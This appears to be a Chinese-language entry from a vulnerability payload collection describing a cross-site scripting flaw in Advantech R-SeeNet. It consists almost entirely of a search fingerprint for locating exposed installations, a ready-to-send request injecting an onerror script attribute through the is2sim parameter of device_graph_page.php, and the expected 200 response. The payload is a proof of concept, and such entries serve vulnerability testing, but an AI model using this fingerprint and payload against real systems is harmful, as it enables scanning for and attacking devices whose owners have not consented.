# AdvantechR-SeeNet存在XSS漏洞

AdvantechR ｜ XSS ｜ —
- **指纹**：`body="r-seenet"`

**Payload**
```
/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22
```
- **响应特征**：200